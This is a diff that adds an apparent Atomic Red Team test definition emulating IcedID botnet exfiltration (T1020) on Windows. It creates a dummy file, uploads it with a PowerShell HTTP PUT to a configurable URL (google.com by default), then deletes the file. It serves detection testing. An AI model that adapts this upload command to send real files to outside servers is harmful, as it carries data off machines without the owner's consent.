@@ -1,0 +1,58 @@
+{
+  "id": "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0",
+  "name": "IcedID Botnet HTTP PUT",
+  "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "af59b5cd-58f1-4917-8018-e76de7546be0",
+      "type": "execute-command",
+      "data": {
+        "command": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b5593471-ab1c-4502-8cf1-647a4c112b71",
+      "type": "execute-command",
+      "data": {
+        "command": "$fileName = \"#{file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "af59b5cd-58f1-4917-8018-e76de7546be0",
+      "p": "on-success",
+      "o": "b5593471-ab1c-4502-8cf1-647a4c112b71"
+    },
+    {
+      "s": "af59b5cd-58f1-4917-8018-e76de7546be0",
+      "p": "on-failure",
+      "o": "b5593471-ab1c-4502-8cf1-647a4c112b71"
+    }
+  ],
+  "tags": [
+    "T1020",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "file",
+      "type": "string",
+      "description": "Exfiltration File",
+      "value": "C:\\temp\\T1020_exfilFile.txt"
+    },
+    {
+      "name": "domain",
+      "type": "url",
+      "description": "Destination Domain",
+      "value": "https://google.com"
+    }
+  ]
+}
